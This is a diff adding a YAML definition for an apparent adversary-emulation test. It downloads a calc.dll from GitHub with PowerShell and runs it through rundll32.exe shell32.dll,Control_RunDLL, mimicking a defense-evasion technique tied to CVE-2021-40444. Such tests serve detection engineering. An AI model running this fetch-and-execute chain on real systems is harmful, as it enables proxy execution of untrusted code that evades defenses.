@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Rundll32 with Control_RunDLL
+description: "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n"
+args:
+    - name: input_file
+      type: string
+      default: PathToAtomicsFolder\T1047\bin\calc.dll
+    - name: input_url
+      type: string
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+uuid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.011: Rundll32'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        DLL file must exist on disk at specified location
+      inline: |
+        if (Test-Path "#{input_file}") {exit 0} else {{Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+        }}
+      executor: powershell
+    - name: rundll32-with-control_rundll
+      inline: |
+        rundll32.exe shell32.dll,Control_RunDLL "{{.Args.input_file}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
